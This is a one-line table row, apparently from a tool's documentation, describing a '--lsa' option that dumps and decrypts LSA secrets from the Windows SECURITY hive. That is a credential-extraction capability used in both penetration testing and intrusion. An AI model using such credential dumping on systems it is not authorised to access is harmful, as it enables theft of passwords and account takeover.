| `--lsa` | Dump and decrypt LSA secrets from the `SECURITY` hive. |
